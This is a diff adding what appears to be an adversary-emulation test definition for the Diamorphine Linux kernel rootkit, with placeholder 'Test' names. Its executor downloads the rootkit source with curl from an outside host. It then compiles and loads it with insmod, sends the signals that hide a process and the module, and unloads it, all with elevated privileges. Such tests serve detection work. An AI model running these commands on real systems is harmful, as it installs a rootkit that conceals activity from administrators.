@@ -1,0 +1,39 @@
+attack_technique: Test
+display_name: Diamorphine Rootkit
+atomic_tests:
+- name: Test
+  description: Test
+  supported_platforms:
+    - linux
+    - containers
+  input_arguments:
+    Temporary Path:
+      description: Path to the temporary directory used for this test
+      type: Path
+      default: /tmp/test_tmp_dir
+  dependencies:
+    - description: |
+        Kernel headers for the current version of the running kernel
+      prereq_command: |
+        ls "/lib/modules/$(uname -r)/build" || ls "/usr/src/kernels/$(uname -r)"
+      get_prereq_command: |
+        apt-get -y install linux-headers-$(uname -r) || yum install -y kernel-devel-$(uname -r) gcc
+  executor:
+    command: |
+      mkdir "#{Temporary Path}" 2>/dev/null
+      curl https://raw.githubusercontent.com/sysdig/Diamorphine/master/diamorphine.c -s > "#{Temporary Path}/diamporphine.c"
+      curl https://raw.githubusercontent.com/sysdig/Diamorphine/master/diamorphine.h -s > "#{Temporary Path}/diamorphine.h"
+      curl https://raw.githubusercontent.com/sysdig/Diamorphine/master/Makefile -s > "#{Temporary Path}/Makefile"
+      cd "#{Temporary Path}"
+      make -s
+      if [ $? -ne 0 ]; then echo "'make' errored out, probably missing kernel headers in '/lib/modules/$(uname -r)/build'"; exit 1; fi
+      insmod diamorphine.ko
+      sleep 15 & SLEEP_PID=$!
+      kill -31 $SLEEP_PID
+      kill -31 $SLEEP_PID
+      kill -63 3735928559 2>/dev/null || kill -63 0 2>/dev/null
+      rmmod diamorphine
+    cleanup_command: |
+      rm -r "#{Temporary Path}"
+    name: bash
+    elevation_required: true
